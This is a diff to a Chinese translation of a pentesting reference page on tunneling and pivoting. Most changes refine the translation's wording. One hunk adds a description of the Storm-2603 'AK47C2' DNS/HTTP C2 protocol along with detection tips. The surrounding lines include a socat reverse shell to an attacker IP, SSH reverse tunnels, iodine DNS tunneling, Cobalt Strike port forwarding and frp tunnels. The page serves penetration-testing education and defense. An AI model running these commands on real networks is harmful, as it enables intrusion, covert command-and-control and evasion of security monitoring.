@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### 反向端口转发
 
-这对于从内部主机通过 DMZ 获取反向 shell 到您的主机非常有用：
+这对于通过 DMZ 从内部主机获取反向 shell 到您的主机非常有用：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -88,12 +88,12 @@ iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
-> **安全 - Terrapin 攻击 (CVE-2023-48795)**
+> **安全 – Terrapin 攻击 (CVE-2023-48795)**
 > 2023年的Terrapin降级攻击可以让中间人篡改早期的SSH握手并将数据注入到**任何转发通道**（`-L`，`-R`，`-D`）。确保客户端和服务器都已打补丁（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或者在依赖SSH隧道之前明确禁用易受攻击的`chacha20-poly1305@openssh.com`和`*-etm@openssh.com`算法，在`sshd_config`/`ssh_config`中进行设置。
 
 ## SSHUTTLE
 
-您可以通过**ssh**将所有**流量**通过主机**隧道**到**子网络**。\
+您可以通过**ssh**将所有**流量**隧道到**子网络**通过一个主机。\
 例如，转发所有流量到10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -157,13 +157,13 @@ rportfwd stop [bind port]
 需要注意：
 
 - Beacon 的反向端口转发旨在 **将流量隧道传输到 Team Server，而不是在单个机器之间中继**。
-- 流量是 **在 Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
+- 流量在 **Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
 - **不需要管理员权限** 来在高端口上创建反向端口转发。
 
 ### rPort2Port 本地
 
 > [!WARNING]
-> 在这种情况下，**端口是在 beacon 主机上打开的**，而不是在 Team Server 上，**流量被发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的主机:端口。
+> 在这种情况下，**端口在 beacon 主机上打开**，而不是在 Team Server 上，**流量发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的主机:端口。
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -199,9 +199,9 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**代理和代理使用相同的版本**
+**代理和代理使用相同版本**
 
-### 隧道传输
+### 隧道技术
 ```bash
 # Start proxy server and automatically generate self-signed TLS certificates -- Attacker
 sudo ./proxy -selfcert
@@ -276,7 +276,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### Port2Port通过socks
+### 通过socks的Port2Port
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -350,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 您需要拥有**系统的RDP访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用Windows的远程桌面服务功能中的`动态虚拟通道`（`DVC`）。DVC负责**在RDP连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用Windows的远程桌面服务功能中的`Dynamic Virtual Channels`（`DVC`）。DVC负责**在RDP连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
@@ -364,7 +364,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-现在在你的机器（攻击者）上确认端口 1080 正在监听：
+现在，在你的机器（攻击者）上确认端口 1080 正在监听：
 ```
 netstat -antb | findstr 1080
 ```
@@ -372,7 +372,7 @@ netstat -antb | findstr 1080
 
 ## 代理 Windows GUI 应用程序
 
-您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理进行导航。\
+您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理导航。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
 在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 连接。
 
@@ -397,7 +397,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
-你也可以使用一个连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
+你也可以使用连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
 
 ## YARP
 
@@ -415,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-隧道将非常慢。您可以通过使用以下命令创建一个压缩的SSH连接：
+隧道将非常慢。您可以通过使用以下命令在此隧道中创建一个压缩的SSH连接：
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -451,6 +451,40 @@ Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tc
 ## Go 中的隧道
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
+
+### 自定义 DNS TXT / HTTP JSON C2 (AK47C2)
+
+Storm-2603 行动者创建了一个 **双通道 C2 ("AK47C2")**，仅利用出站 **DNS** 和 **普通 HTTP POST** 流量——这两种协议在企业网络中很少被阻止。
+
+1. **DNS 模式 (AK47DNS)**
+• 生成一个随机的 5 字符 SessionID（例如 `H4T14`）。
+• 为 *任务请求* 前缀 `1`，为 *结果* 前缀 `2`，并连接不同字段（标志、SessionID、计算机名称）。
+• 每个字段都用 ASCII 密钥 `VHBD@H` **XOR 加密**，十六进制编码，并用点连接在一起——最终以攻击者控制的域名结束：
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• 请求使用 `DnsQuery()` 获取 **TXT**（并回退到 **MG**）记录。
+• 当响应超过 0xFF 字节时，后门 **将数据分片**为 63 字节，并插入标记：
+`s<SessionID>t<TOTAL>p<POS>` 以便 C2 服务器可以重新排序它们。
+
+2. **HTTP 模式 (AK47HTTP)**
+• 构建一个 JSON 信封：
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• 整个数据块进行 XOR-`VHBD@H` → 十六进制 → 作为 **`POST /`** 的主体发送，头部为 `Content-Type: text/plain`。
+• 回复遵循相同的编码，`cmd` 字段通过 `cmd.exe /c <command> 2>&1` 执行。
+
+蓝队注意事项
+• 寻找不寻常的 **TXT 查询**，其第一个标签是长十六进制，并且总是以一个稀有域名结束。
+• 一个恒定的 XOR 密钥后跟 ASCII-十六进制很容易用 YARA 检测： `6?56484244?484`（十六进制中的 `VHBD@H`）。
+• 对于 HTTP，标记纯十六进制且字节数为偶数的 text/plain POST 主体。
+
+{{#note}}
+整个通道适合 **标准 RFC 兼容查询**，并保持每个子域标签在 63 字节以下，使其在大多数 DNS 日志中隐蔽。
+{{#endnote}}
 
 ## ICMP 隧道
 
@@ -500,7 +534,7 @@ chmod a+x ./ngrok
 
 **文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_如果需要，也可以添加身份验证和 TLS。_
+_如果需要，也可以添加身份验证和TLS。_
 
 #### 隧道 TCP
 ```bash
@@ -574,11 +608,11 @@ url: http://127.0.0.1:8000
 ```bash
 cloudflared tunnel run mytunnel
 ```
-因为所有流量都通过 **443 端口出站**，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 - 尽可能使用容器或 `--user` 标志。
+因为所有流量都通过主机 **出站 443** 端口发送，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 - 尽可能使用容器或 `--user` 标志。
 
 ## FRP (快速反向代理)
 
-[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0（2024年5月）** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 - 无需额外的二进制文件。
+[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0 (2024年5月)** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 - 无需额外的二进制文件。
 
 ### 经典反向 TCP 隧道
 ```bash
@@ -610,7 +644,7 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 ```
 上述命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具 – 非常适合利用现有资源进行转发。
 
-## 使用 QEMU 的隐蔽 VM 基础隧道
+## 使用 QEMU 的隐蔽 VM 基于隧道
 
 QEMU 的用户模式网络 (`-netdev user`) 支持一个名为 `hostfwd` 的选项，该选项 **将 *主机* 上的 TCP/UDP 端口绑定并转发到 *客户机* 中**。 当客户机运行完整的 SSH 守护进程时，hostfwd 规则为您提供一个一次性 SSH 跳转盒，完全存在于一个临时 VM 中 – 非常适合隐藏 C2 流量，因为所有恶意活动和文件都保留在虚拟磁盘中。
 
@@ -654,7 +688,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 • 只有两个未签名的可执行文件 (`qemu-system-*.exe`) 访问磁盘；没有安装驱动程序或服务。
 • 主机上的安全产品看到的是 **良性的回环流量**（实际的 C2 在虚拟机内部终止）。
-• 内存扫描器从不分析恶意进程空间，因为它存在于不同的操作系统中。
+• 内存扫描器从未分析恶意进程空间，因为它存在于不同的操作系统中。
 
 ### Defender 提示
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## 参考文献
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
